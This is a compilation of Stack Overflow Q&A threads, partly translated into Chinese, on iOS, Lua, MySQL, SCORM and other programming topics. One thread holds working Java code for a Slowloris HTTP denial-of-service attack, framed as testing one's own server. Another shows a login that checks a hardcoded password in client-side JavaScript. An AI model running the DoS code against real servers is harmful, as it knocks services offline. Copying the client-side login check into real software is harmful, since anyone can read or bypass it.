I have a VC that calls out a "FilterVC". I only have one FilterVC that is called by 3 different "filter buttons", and I will just populate the VC depending on the button. The issue is, one button might have just 2 items that is needed to be shown, another one might containg up to 50\. Was wondering how do I adjust the height of the popovercontroller that contains the uitableview? Also, is this the right way in dealing with popovers, 3 segues connected to one VC??? (It needed an anchor point)

Here's what it looks like

![enter image description here](https://i.stack.imgur.com/ENqSY.png)

![enter image description here](https://i.stack.imgur.com/g580N.png)

As a follow up question: Is this the right way to do it on an ipad? I feel like most people prefer the uipicker. The guy that answered my first question said it's more of a design thing. Now since I'm no designer, as a user, do you think uitableview is more appealing?

Thanks for your time!!

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T16:29:21.650

在您在弹出窗口中显示的视图中，在`self.contentSizeForViewInPopover`您知道大小并在视图显示之前立即设置。

在选择器上使用表格视图的主要好处是它有一个滚动指示器，因此您可以看到选项列表的长度。同样显然，您可以准确控制列表的显示方式。因此，如果它适合您的 UI 样式，尤其是选项列表很长时，表格视图应该会更好。

# eclipse - 在 Visual Studio for C++ 和 Eclipse 中自动将 std:: 添加到 cout 等

> ID：16215585
> 
> 赞同：0
> 
> 时间：2013-04-25T13:06:39.847
> 
> 标签：eclipse, visual-studio-2008, eclipse-juno

编辑：在问题的标题和正文中添加了“和 Eclipse”。两个地方都需要。

**我知道“你不能在好的 C++ 中“使用””所以......**

我如何在 MS Visual Studio 2008 (VC++) 和/或 Eclipse Juno 中添加工具（启用某些现有工具）以允许我在`cout`按下空格键时键入，或者`<`让编辑器`cout`将`std::cout`.

我可以将此扩展到所有`std::`项目吗？

这样的工具能否识别出`cout`在“代码”空间中而不是在“评论”空间或“引用字符串”空间中？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:08:28.760

您可以`using namespace std;`在 s 之后添加到文件顶部`#include`以隐式添加`std::`. 你的代码文本不会改变（也就是说，编译器不会去并以文本方式预先挂`std::`在任何地方），但它会知道在`std`命名空间中查找它在其他地方找不到的符号。

# jquery - JQuery - 在CKEDITOR中动态修改CSS

> ID：16215587
> 
> 赞同：0
> 
> 时间：2013-04-25T13:06:46.533
> 
> 标签：jquery, css, ckeditor

我想动态修改CKEDITOR中的CSS。我读到它可以通过jquery。但我不知道如何告诉 jquery，我想修改 CKEDITOR 中的元素，而不是整个文档。

我尝试了这样的事情，但它不起作用：

```
function ok()  {
        $('textarea#editor1').css({
            "color": "Blue",
            "background-color": "orange"
    }); 
```

有任何想法吗？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:17:31.827

你可以使用看起来像这样的东西

```
var IframeContent = document.getElementsByClassName('cke_wysiwyg_frame')[0].contentDocument

// Do whatever you want to as if it was your main "document" element
IframeContent.getElementById("...");
IframeContent.getElementsByClassName("..."); 
```

或者使用 jQuery，您可能会对这个解决方案感兴趣： [How to get body's content of an iframe in Javascript?](https://stackoverflow.com/questions/926916/how-to-get-the-bodys-content-of-an-iframe-in-javascript)

旁注，我认为您无法从远程/不同域访问 iframe 的内容，因此如果 CKEDITOR 不在您的域中，请检查此内容。

# jboss5.x - PersistenceProvider not found Exception in JBOSS AS 5.1.0 GA

> ID：16215588
> 
> 赞同：1
> 
> 时间：2013-04-25T13:06:50.483
> 
> 标签：jboss5.x, classnotfoundexception, toplink-essentials, jpa-1.0

I am trying to deploy the product in JBOSS AS 5.1.0 GA using eclipse in Linux.

Previously it was executed successfully on tomcat 6. While deploying I got many errors. I had solved one by one.

But now ClassNotFoundException raised due to the PersistenceProvider.

My product environment is JPA 1.0\. and I am using toplink-essentials.jar, toplink-essentials-agent.jar. (my toplink version is 2.0)

Please see the bug decription...

`11:46:08,276 ERROR [AbstractKernelController] Error installing to Start: name=persistence.unit:unitName=#Entity state=Create java.lang.ClassNotFoundException: oracle.toplink.essentials.PersistenceProvider from BaseClassLoader@12bb617{VFSClassLoaderPolicy@bfa9d6{name=vfsfile:/opt/jboss-5.1.0.GA/server/default/deploy/iportman_gpl.war/ domain=ClassLoaderDomain@16877f8{name=DefaultDomain parentPolicy=BEFORE parent=org.jboss.bootstrap.NoAnnotationURLClassLoader@1837697} roots=[MemoryContextHandler@19344978[path= context=vfsmemory://3j011-idx41v-hfxjen4j-1-hfxjf9qd-2a real=vfsmemory://3j011-idx41v-hfxjen4j-1-hfxjf9qd-2a], FileHandler@22157425[path=iportman_gpl.war/WEB-INF/classes context=file:/opt/jboss-5.1.0.GA/server/default/deploy/ real=file:/opt/jboss-5.1.0.GA/server/default/deploy/iportman_gpl.war/WEB-INF/classes/]`

This is the only bug showing while I am trying to deploy my project which is a WAR file.

While in execution time jboss is loading the both jars. (toplink-essentials.jar, toplink-essentials-agent.jar). (This is also showing on error console)

`DelegatingHandler@13596360[path=iportman_gpl.war/WEB-INF/lib/toplink-essentials.jar context=file:/opt/jboss-5.1.0.GA/server/default/deploy/ real=file:/opt/jboss-5.1.0.GA/server/default/deploy/iportman_gpl.war/WEB-INF/lib/toplink-essentials.jar] DelegatingHandler@32401617[path=iportman_gpl.war/WEB-INF/lib/toplink-essentials-agent.jar context=file:/opt/jboss-5.1.0.GA/server/default/deploy/ real=file:/opt/jboss-5.1.0.GA/server/default/deploy/iportman_gpl.war/WEB-INF/lib/toplink-essentials-agent.jar]`

but still it is showing the error.

When I had Google about this issue then i had seen some explanations like.. "may be it is loading two PersistenceProvider classes or jboss also loading their JPA classes".

But i had set the parent-first="false" in my **jboss-classloading.xml**

below code is in my /WEB-INF/jboss-classloading.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<classloading xmlns="urn:jboss:classloading:1.0"
export-all="NON_EMPTY"
import-all="true"
parent-first="false">
</classloading> 
```

I also declared the below code in my /WEB-INF/classes/META-INF/**persistence.xml**

```
 <persistence-unit name="Entity" transaction-type="RESOURCE_LOCAL">
 <provider>oracle.toplink.essentials.PersistenceProvider</provider> 
```

Please help me to solve the problem. I posted the same issue in JBOSS community for their help, but i did not get any response.

(For detail decription for persistence.xml and list of all jars, please see the [Jboss community link](https://community.jboss.org/message/810207))

So, Anyone help me to find out problem. Any suggestions will be a greatly helpful to me... Thanks in Advance..

(Sorry for my bad English)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-26T11:01:47.227

当我删除***persistence.xml***`<provider>`中标签之间的空格时，上述问题已经解决，如下所示。

 *`<provider>oracle.toplink.essentials.PersistenceProvider</provider>`*

# asp.net - Telerik: Unable to get value of property 'open': Object is null or undefined

> ID：16215598
> 
> 赞同：0
> 
> 时间：2013-04-25T13:07:20.520
> 
> 标签：asp.net, telerik

I've got a web site that uses Telerik controls. I have an editing form that opens in a RadWindow. This functionality exists on two separate pages one it works perfectly the second the RadWindow never opens. I've stared and stared at the two pages trying to figure out where I went wrong but I cannot figure it out.

**Errors:**

1.) Telerik.Web.UI.WebResource.axd:3

```
Uncaught TypeError: Cannot set property 'control' of undefined 
```

2.) Telerik.Web.UI.WebResource.axd:11319

```
Uncaught TypeError: Cannot call method 'open' of undefined 
```

This one actually has some legible code.

```
window.radopen=function(b,a){var c=GetRadWindowManager();
return c.open(b,a);//Error Here 
```

**Page RadWindow Components:**

```
 <telerik:RadWindowManager ID="RadWindowManager2" runat="server" Modal="true" ShowContentDuringLoad="false">
    <Windows>
        <telerik:RadWindow runat="server" ID="rwEditCust" Width="500px" Height="500px" Title="Edit Cust" Modal="true" ReloadOnShow="true"></telerik:RadWindow>
    </Windows>
</telerik:RadWindowManager>

<telerik:RadAjaxManagerProxy ID="rampCustList" runat="server"> 
 <AjaxSettings>
    <telerik:AjaxSetting AjaxControlID="rampCustList">
        <UpdatedControls>
            <telerik:AjaxUpdatedControl ControlID="rgCustList" />
        </UpdatedControls>
    </telerik:AjaxSetting>
</AjaxSettings>
</telerik:RadAjaxManagerProxy>

<telerik:RadCodeBlock ID="RadCodeBlock1" runat="server">

<script type="text/javascript">

    function ShowEditCust(id) {
      alert("Test");
      window.radopen("EditCust.aspx?A=E&id=" + id, "rwEditCust");
      return false;
    }

    function refreshGrid(arg) {
      var ajaxManager = $find("<%= RadAjaxManager.GetCurrent(this.Page).ClientID %>");
      ajaxManager.ajaxRequest();
    }

</script>
</telerik:RadCodeBlock> 
```

Conventional wisdom would say that this has to be an issue with this view page bc I'm not getting any errors in my code behind page. All the components seem to be loading correctly otherwise my other page would break as well. Any help would be much appreciated.

**Udpate**

~~In my design view I get an error on my radajaxmanagerproxy that it's missing a runat=server but it does have that attribute.~~

Resolved the above error. No effect on the primary issue.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-26T12:38:50.583

在我看来，一段注释的代码导致了错误。删除了注释代码，问题已解决。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-09-09T12:42:41.270

就我而言，事实证明我放错了`<telerik:RadWindow`外部`<form runat="server"></form>`标签

# lua - Lua script - collection data and save into a file

> ID：16215602
> 
> 赞同：0
> 
> 时间：2013-04-25T13:07:24.930
> 
> 标签：lua

I am working on coding lua script.

What I am coding is..Collecting the data and save it into the certain file.

*Situation* :
There are two sensors that when they recognize the object in front of it, the value of the sensor will be increased.
I want to save the data of the value of sensor every 100ms with time.
Time format would be "2013-04-25 10:30:004"

What I did is here.

```
===========================================================

require("TIMER")
require("TIMESTAMP")
require("ANALOG_IN")

function OnExit()
    print("Exit code...do something")
end

function main()

    timer = "TIMER"
    analogsensor_1 = "AIR_1"
    analogsensor_2 = "AIR_2"

    while true do 
        valueOfSensor_1 = ANALOG_IN.readAnalogIn(analogsensor_1);
        valueOfSensor_2 = ANALOG_IN.readAnalogIn(analogsensor_2);

        write(colltection_of_data.txt)
        go(print(valueOfSensor_1), 0.1)     //print value of sensor every 100ms
        print(time)
        go(print(valueOfSensor_2), 0.1)
        print(time)
    end 
    TIMER.sleep(timer,500)

end 

print("start main")
main()

================================================================ 
```

I know it's not complete code. How can I save the data into certain file? and how can I show the time format like that?

Thank you in advance!

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-25T13:32:05.737

要获取您致电的日期和时间：

`local timestr = os.date("%Y-%m-%d %H:%M:%S")`

现在要将其保存到文件中，您需要打开文件

`local filehandle = io.open(filename[, mode])`-[手册](http://www.lua.org/manual/5.1/manual.html#pdf-io.open)

要输出所需的数据，然后使用

```
local filehandle = io.open("Log.txt", "w+")
filehandle:write(timestr, " - Sensor1: ", tostring(valueOfSensor1), "\n") 
```

当然，您只打开一次文件，然后每 x (milli) 秒发出一次写入命令。完成后：

`filehandle:close()`

PS请尽可能使用当地人。它比全局变量快得多（`local analogSensor_1`而不仅仅是`analogSensor_1`）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T13:29:35.090

抱歉，没有小数秒

```
-- Open file
local file = assert(io.open('collection_of_data.txt','wb'))

-- Write to file
local dt = os.date'*t'
local time_string = 
   dt.year..'-'..('0'..dt.month):sub(-2)..'-'..('0'..dt.day):sub(-2)..' '..
   ('0'..dt.hour):sub(-2)..':'..('0'..dt.min):sub(-2)..':'..('0'..dt.sec):sub(-2)
file:write(valueOfSensor_1, '\n', time_string, '\n')

-- Close file
file:close() 
```

# python - Check if part of string contains regex pattern

> ID：16215605
> 
> 赞同：0
> 
> 时间：2013-04-25T13:07:31.343
> 
> 标签：python, string

I have a list of strings. Each string contains random text and a sequence of numbers and letters that may or may not match a regex.

Example string:

```
"Bla bla bla 123-abc-456 bla bla blaaha" 
```

`123-abc-456` will match a regex.

I wish to store all those matching sequences into a new list; sequence only that is, not the bla bla bla.

How could this be done? I need to break out the sequence only using the regex somehow.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:10:42.077

如果您感兴趣的每个字符串只有一个“序列”：

```
In [1]: import re

In [2]: re.search(r'\d{3}-\D{3}-\d{3}',
    ..: "Bla bla bla 123-abc-456 bla bla blaaha").group()
Out[2]: '123-abc-456' 
```

只需`for`循环执行此操作并将结果保存到新列表即可。

如果您想要多个匹配项，请`re.findall`按照上面的建议使用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T13:10:53.950

在您的正则表达式中使用大括号。然后，您可以使用 groups(1)、groups(2) 来隔离匹配的部分。

# ios - 防止用户通过登录进入 UITabBarController

> ID：16215609
> 
> 赞同：0
> 
> 时间：2013-04-25T13:07:44.007
> 
> 标签：ios, objective-c, uitabbarcontroller

我有一个登录视图，它指向一个`UITabBarController`带有四个选项卡的选项卡。我想要的是当密码为空或错误时，提示用户留在同一视图（登录视图）而不是标签栏控制器。换句话说，如果密码正常（非空且正确），我希望能够查看标签栏。是否可以一直显示登录视图，直到提供的密码正确？有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:13:30.650

您所描述的是模态视图控制器。如果您有一个现有的登录控制器，请展示它：

```
[someViewController presentViewController:loginController animated:YES completion:nil] 
```

这将定位`loginController`在所有其他控制器之上。当用户输入了正确的密码（并且只有这样！）你应该关闭它：

```
[self dismissViewControllerAnimated:YES completion:nil]; 
```

如果您希望`loginController`有一个标题栏，请记住将其包装在 a 中`UINavigationController`并显示导航控制器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T13:14:11.940

YourAppDelegate.m：

```
@interface YourAppDelegate()
@property( nonatomic, retain ) UITabBarController *tabBarController;
@property( nonatomic, retain ) UIViewController *loginViewController;
- (void)allocateAndShowLoginViewController;
- (void)allocateAndShowMenuController;
@end
@implementation YourAppDelegate
@synthesize tabBarController;
@synthesize loginViewController;
#pragma mark -
#pragma mark Application lifecycle

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]] autorelease];           
    [self.window makeKeyAndVisible];
    [self allocateAndShowLoginViewController];       
    return YES;
}

- (void)allocateAndShowLoginViewController{
     // Show Login View Controller (for example:)
     // My Sample login view controller uses delegate to report when user has been logged in
     self.loginViewController = [[[UIViewController alloc] initWithDelegate:self] autorelease];
     self.window.rootViewController = loginViewController;
}  

- (void)allocateAndShowTabBarController{
    self.tabBarController = [[[UITabBarController alloc] init] autorelease];

    UINavigationController      *viewController1 = [[[UINavigationController alloc] initWithRootViewController:[[[UIViewController alloc] init] autorelease]] autorelease];

    UINavigationController      *viewController2 = [[[UINavigationController alloc] initWithRootViewController:[[[UIViewController alloc] init] autorelease]] autorelease];

    self.tabBarController.viewControllers = @[viewController1, viewController2];
    self.tabBarController.customizableViewControllers = nil;

    self.window.rootViewController = self.tabBarController;
}

#pragma mark - loginViewControllerDelegate
- (void)loginViewControllerDidLogin:(PSLoginViewController*)controller{
    [self allocateAndShowMenuController];
} 
```

类似的东西

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T13:11:50.757

据我了解，您想在某个时间禁用标签栏。

如果你使用`UITabBarController`你可以使用

```
- (BOOL)tabBarController:(UITabBarController *)tabBarController shouldSelectViewController:(UIViewController *)viewController {
    return NO; 
} 
```

或者你可以禁用`userInteractionEnabled`

```
myTabBar.userInteractionEnabled = NO; 
```

您还可以向您`UITabBarController`的示例添加一些子视图以淡出您的标签栏

```
UIView *view = [[UIView alloc] initWithFrame:self.view.bounds];
view.backgroundColor = [UIColor blackColor];
view.alpha = 0.3f;
[self.tabBarController.view addSubview:view];
[view release]; 
```

# ios - UIBubbleTableView 内部的图像

> ID：16215611
> 
> 赞同：3
> 
> 时间：2013-04-25T13:07:45.550
> 
> 标签：ios, objective-c, xcode, storyboard

我正在制作一个 iOS 聊天应用程序。我`UIBubbleTableView`用来显示文本和图像。

现在，我希望图像可以点击，它会移动到另一个视图（人们可以看到它的全尺寸）。但`UIBubbleTableView`似乎不支持它，所以我该如何解决它？

这是我在 viewDidLoad 中的代码：

```
- (void)viewDidLoad
{
    //Something here//
    [super viewDidLoad];
    NSBubbleData *photoBubble = [NSBubbleData dataWithImage:[UIImage         
    imageNamed:@"halloween.jpg"] date:[NSDate dateWithTimeIntervalSinceNow:-290]     
    type:BubbleTypeSomeoneElse];
    //something else here//
} 
```

使用这些代码，它只显示图像。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-06-11T00:45:51.053

我知道这不是推荐或理想的方法，但这是我暂时所做的。当我找到一个好方法时，我可能会回到它并“正确”地做它。

对于每个 NSBubbleData 对象，我在其视图中添加了一个触摸手势。当用户触摸时，该`touchEventOnImage:`方法被调用。从 sender 那里可以得到手势识别器，它的视图是 NSBubbleData 设置的 UIImageView 的视图。您可以全屏显示此图像。

这是我使用的代码：

```
- (void)addTouchGestureToBubble:(NSBubbleData *)oBubbleData
{
    UITapGestureRecognizer * tapRecognizer = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(touchEventOnImage:)];
    [tapRecognizer setNumberOfTouchesRequired:1];
    //Don't forget to set the userInteractionEnabled to YES, by default It's NO.
    oBubbleData.view.userInteractionEnabled = YES;
    [oBubbleData.view addGestureRecognizer:tapRecognizer];
}

- (void)touchEventOnImage:(id)sender
{
    if( [sender isKindOfClass:[UIGestureRecognizer class]] )
    {
        UIGestureRecognizer * recognizer = (UIGestureRecognizer *)sender;

        if( [recognizer.view isKindOfClass:[UIImageView class]] )
        {
            UIImageView * imageView = [[UIImageView alloc] initWithImage:((UIImageView *)recognizer.view).image];
            imageView.contentMode = UIViewContentModeScaleAspectFit;
            imageView.frame = CGRectMake(self.view.frame.origin.x, self.view.frame.origin.y, self.view.frame.size.width, self.view.frame.size.height);
            imageView.backgroundColor = [UIColor blackColor];
            // Remove the corner radius applied in the NSBubbleData class.
            imageView.layer.cornerRadius = 0.0;

            UIViewController * vc = [[UIViewController alloc] init];
            vc.view = imageView;
            [self.navigationController pushViewController:vc animated:YES];
        }
    }
} 
```

我希望这可以帮助你至少取得一些进展。

# livecode - 在我的 Livecode 应用程序中使用 mergExt mergSettings 应该包括什么

> ID：16215613
> 
> 赞同：1
> 
> 时间：2013-04-25T13:07:51.927
> 
> 标签：livecode

我下载了 mergSettings 和 InAppSettingsKit。我注意到在 mergSettings 中演示应用程序的独立应用程序设置中列出了许多 .nib 文件，但我在 mergSettings 下载或 InAppSettingsKit 中都找不到等效文件。

是否有关于如何在 Livecode 应用程序中包含 mergSettings 的教程？如果没有，应该包含哪些文件以及从哪里开始？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T22:16:55.883

请参阅此 youtube 视频，了解如何在复制文件窗格中设置包含内容[http://www.youtube.com/watch?v=zFTsVu7_QOI](http://www.youtube.com/watch?v=zFTsVu7_QOI)

但是，在 1.0.3 中似乎缺少所需的 nib 文件，所以我会尽快将它们放在那里

# scorm - Should I set cmi.objectives.n.id via Javascript scorm API?

> ID：16215619
> 
> 赞同：0
> 
> 时间：2013-04-25T13:08:14.290
> 
> 标签：scorm, scorm2004

Should I set up cmi.objectives.0.id before I set up, for example, cmi.objectives.0.competition_status?

It's in order to interpret REQ_72.4.3.5: "Since the cmi.objectives.n.id is required **to be set first prior to any other objective information**, if the SCO attempts to set..."

E.g.:

```
scorm.setValue('cmi.objectives.0.id', 'obj1'); //?
scorm.setValue('cmi.objectives.0.completion_status', 'completed'); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T15:53:03.253

### （更新）

*抱歉，出于某种原因，我以为您在讨论互动，而不是目标。我的答案已被修改以解决目标。*

是的，目标需要有一个 ID。您可以通过 JavaScript API (SCORM RTE) 或清单设置 ID。必须先设置 ID，然后才能对目标执行任何其他操作，例如设置 completion_status。

> 如果 SCO 请求存储客观信息，则 SCO 需要在任何其他客观信息之前先设置标识符（除非它是通过其他方式初始化的）。一旦 cmi.objectives.n.id 有了值，就不允许将数据模型元素重置为不同的值。

[页 RTE 4-97](http://www.adlnet.gov/resources/SCORM-2004-4th-Edition-Specification?type=technical_documentation)

如果您不确定是否设置了 ID，您可以使用 JavaScript 查看目标是否存在以及是否已为其分配了 ID。

例子：

```
var obj_count = parseInt(scorm.GetValue('cmi.objectives._count'), 10);

if(obj_count === 0){

    //We know for sure no objectives exist in your SCO yet.
    //Try setting the ID
    scorm.SetValue('cmi.objectives.0.id', 'obj1');

}

var id = scorm.GetValue('cmi.objectives.0.id');
var err = parseInt(scorm.GetLastError(), 10);

if(err == 0 && id == "obj1"){ 

    //continue as planned...

} else {

    //there is an error or the ID is undefined. Time to troubleshoot.

} 
```

如果 ID 已设置但您仍无法设置`completion_status`，则可能需要仔细检查清单：

> 如果为内容包清单中`<imsss:objectives>`的元素定义了`<imscp:item>`，则 LMS 负责根据为学习活动引用和管理的目标进度信息为 SCO 初始化目标运行时数据 (cmi.objectives.n.xxx) . 与目标相关的运行时数据 (cmi.objectives.n.xxx) 不应为活动的关联 SCO 初始化，除非在排序信息 (`<imsss:primaryObjective>`或 `<imsss:objective>`) 中定义了目标 ID 属性。目标 ID 属性应用于初始化 cmi.objectives.n.id 值。清单中定义的目标数量决定了需要初始化的目标状态信息的数量。

# java - Java - 模拟 Slowloris HTTP DoS 攻击

> ID：16215621
> 
> 赞同：-1
> 
> 时间：2013-04-25T13:08:15.910
> 
> 标签：java, perl, load, ddos

我需要编写 java 代码测试来模拟我的 Web 服务器上的 Slowloris HTTP DoS 攻击。我找到了一个执行此操作的 perl 代码：http: [//ha.ckers.org/slowloris/](http://ha.ckers.org/slowloris/)

我的环境不是固定的，这意味着我不能保证在机器上安装了 active-perl。还有另一种方法吗？有没有办法使用 jerl ( [https://code.google.com/p/jerl/](https://code.google.com/p/jerl/) ) 来做到这一点而无需安装 active-perl (也许我可以将所需的库添加到我的 java 项目中？)？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-09T21:03:58.903

```
switch (dosMethod) {
        case GET:
            while(!StopWorking)
            {
                for(int i=0;i<per_Thread;i++)
                {
                    if(socks[i].isConnected())
                    {
                    try
                    {
                        PrintWriter pw = new PrintWriter(socks[i].getOutputStream());
                        pw.println("GET / HTTP/1.1");
                        pw.println("Host: " + hp.getHostText());
                        pw.println();
                        pw.flush();
                    }
                    catch (Exception e){}
                    }
                    else
                    {
                        try {
                            socks[i] = new Socket(InetAddress.getByName(hp.getHostText()), hp.getPort());
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
            break;
        case POST:
            for(int i=0;i<per_Thread;i++)
            {
                try {
                    socks[i].close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            while(!StopWorking)
            {
                for(int i=0;i<per_Thread;i++)
                {
                    if(socks[i].isConnected())
                    {
                        try {
                            PrintWriter pw = new PrintWriter(socks[i].getOutputStream());
                            pw.println();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                    else
                    {
                        try {
                            socks[i] = new Socket(InetAddress.getByName(hp.getHostText()), hp.getPort());
                            PrintWriter pw = new PrintWriter(socks[i].getOutputStream());
                            pw.println("POST / HTTP/1.1");
                            pw.println("User-Agent: %s");
                            pw.println("Connection: keep-alive");
                            pw.println("Keep-Alive: 900");
                            pw.println("Content-Length: 10000");
                            pw.println("Content-Type: application/x-www-form-urlencoded");
                            pw.println();
                            pw.flush();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
            break;
    } 
```

其中 socks 是一个套接字数组 (Socket[] socks = new Socket[connsperthread];

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T14:25:25.427

您可以使用用 C++ 编写的这个实现[https://community.quallys.com/blogs/securitylabs/2011/08/25/new-open-source-tool-for-slow-http-attack-vulnerabilities](https://community.qualys.com/blogs/securitylabs/2011/08/25/new-open-source-tool-for-slow-http-attack-vulnerabilities)

# mysql - Multiple mysql joins causing issue with query

> ID：16215623
> 
> 赞同：0
> 
> 时间：2013-04-25T13:08:20.937
> 
> 标签：mysql, join, match, distinct, having

I'm using the following query to filter and score results which are assigned to certain categories which is working perfectly right now. However, if I try to do another join, to be able to factor in tag matches to the scoring, I run in to an issue where lots of results are returned which aren't assigned to the 3 categories.

Here's the working query...

```
 SELECT DISTINCT results.*,
                    ( 
                        3*(MATCH(body) AGAINST('*' IN BOOLEAN MODE)) + 
                        5*(MATCH(title) AGAINST('*' IN BOOLEAN MODE)) + 
                        1*usefulness + 
                        30*(MATCH(body) AGAINST('""' IN BOOLEAN MODE)) + 
                        20*(MATCH(title) AGAINST('""' IN BOOLEAN MODE)) + 
                        5*shares 
                    ) AS score 
        FROM results
        INNER JOIN categories c on results.ID = c.RESULT_ID
        WHERE c.name in ('refinance', 'condo', 'usda')
        AND ( results.scope = 'all' OR results.scope = 'hi' )
        AND published = 1

        GROUP BY results.ID
        HAVING COUNT(c.c_ID) = 3
        ORDER BY score DESC 
        LIMIT 8 OFFSET 0 
```

Adding the following line below the categories results, is what's giving me problems

```
INNER JOIN tags ON results.id = tags.result_id 
```

It's as if the following line stops working when I add the 2nd join

```
HAVING COUNT(c.c_ID) = 3 
```

I'm at a loss here and any help would be greatly appreciated!

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:32:27.130

失败是因为新`count()`联接中有多行与原始数据匹配。 `Count()`计算非空值。因此，如果每个 id 有两个匹配项，那么您将获得 6 行 - 计数为 6。

我认为以下将解决您的问题：

```
having count(distinct c.c_id) = 3 
```

# java - 是否有可能在 MySql Db 中维护 5 个最新版本的主要文件？

> ID：16215632
> 
> 赞同：-1
> 
> 时间：2013-04-25T13:08:37.460
> 
> 标签：java, mysql

Subject:::: 是否有可能在 MySql Db 中维护 5 个最新版本的主要文件？

根据我的项目要求，我需要在 MySql DB 中维护最新的 5 个文件版本，如果版本计数达到 6，我必须自动删除文件的第一个版本..

如果有请帮助我，是否有任何途径可以实现这一要求。在此先感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:15:56.577

假设您将文件存储在数据列中，您可以添加一`versions_back`列，并在`update`和`delete`语句中使用它，如下所示：

表结构：

```
id versions_back data <other columns>
-- ------------- ---- ---------------
10       0       .... ....
12       1       .... ....
13       2       .... ....
15       3       .... ....
17       4       .... .... 
```

执行插入：

```
update versioned_file set versions_back=versions_back+1
insert into versioned_file(data, versions_back) values (<file-data>, 0)
delete versioned_file where versions_back >= 5 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T13:11:12.360

您可以通过创建这样的数据库表来做到这一点

```
File History
------------
File History ID
File History Date
File 
```

只保留最近的 5 行。

# c# - Javascript Modification to Allow Alert

> ID：16215634
> 
> 赞同：0
> 
> 时间：2013-04-25T13:08:40.427
> 
> 标签：c#, javascript, jquery, asp.net-mvc-4, alert

I have very limited javascript experience and Im trying to modify the script below to show an alert of success or failure after the POST attempt:

```
<script language="javascript" type="text/javascript">
        $(function() {
            $("form").submit(function(e) {
                $.post($(this).attr("action"),
                        $(this).serialize(),
                        function(data) {
                    $("#result").html(data);
                });
                e.preventDefault();
            });
        });
</script> 
```

I know it needs to look like this:

```
success: function(){
                    alert("Edit successful");
                },
                error: function(){
                    alert('failure'); 
```

but cant figure out how to integrate it without syntax errors. This script is for performing the POST that the above code would normally perform to allow for this confirmation of success or failure to occur:

```
@using (Html.BeginForm("Admin", "Home", "POST"))
{
    <div class="well">
        <section>
            <br>
            <span style="font-weight:bold">Text File Destination:&#160;&#160;&#160;</span>
            <input type="text" name="txt_file_dest" value="@ViewBag.one">
            <span style="color:black">&#160;&#160;&#160;Example:</span><span style="color:blue"> \\pathpart1\\pathpart2$\\</span>
            <br>
            <br>
            <span style="font-weight:bold">SQL Connection String:</span>
            <input type="text" name="sql_Connection" value="@ViewBag.two">
            <span style="color:black">&#160;&#160;&#160;Example:</span> <span style="color:blue"> Server=myserver;Database=mydatabase;Uid=myusername;Pwd=mypswd</span>
            <br>
            <br>
            <button class="btn btn-success" type="submit" name="document">Save Changes</button>
        </section>
    </div>
} 
```

ActionResult

```
public ActionResult Admin(string txt_file_dest, string sql_Connection)
        {
            AdminModel Values = new AdminModel();

            if (txt_file_dest != null)
            {
                Values.SAVEtxtDestination(txt_file_dest);
            }

            if (sql_Connection != null)
            {
                Values.SAVEsqlConnection(sql_Connection);
            }
            ViewBag.one = Values.GetTextPath();
            ViewBag.two = Values.GetSqlConnection();
            return View();
        } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:12:49.053

```
$.post(
    $(this).attr("action"), // url
    $(this).serialize(), // data
    function(data) { //success callback function
        alert("Edit successful");
    }).error(function() {
        alert('failure');
    }); 
```

这是一个简写的 ajax 函数，你可以写成：

```
$.ajax({
  type: "POST",
  url: $(this).attr("action"),
  data:  $(this).serialize(),
  success: function(data){
    alert("Edit successful");
  },
  error(function() {
    alert('failure');
  }
}); 
```

# javascript - javascript to retain form on login failure

> ID：16215639
> 
> 赞同：1
> 
> 时间：2013-04-25T13:08:49.653
> 
> 标签：javascript, login

Below is my javascript function to authenticate a user... I wanna retain the form on login failure with the username/password textbox being blank.

```
 function authenticate(form)
      {
          if (form.username.value == "Administrator" && form.password.value == "password")
          {
             window.open('OrderList.aspx')/*opens the target page while Id & password matches*/
         }
         else 
         {
             alert("Error Password or Username")
             $("#username").val("")
             $("#password").val("")
             form.????????????('Login.aspx')//so that it stays on the same page wihout reloading the page. 
I tried window.open, but it opens another instance of the form.
             /*displays error message*/
         }
     } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T13:11:08.267

我假设你正在解雇这个`onclick`要么`onSubmit`。为了帮助防止表单提交，您需要使用`onSubmit`并让它返回此函数的结果。在验证失败的情况下，您的 javascript 函数需要`return false;`阻止表单被提交。

当验证通过时，您可以`return true;`或者什么都不做（假设您希望表单继续被提交......如果您只想发出对 的调用`window.open()`，那么您应该`return false;`在这两种情况下。

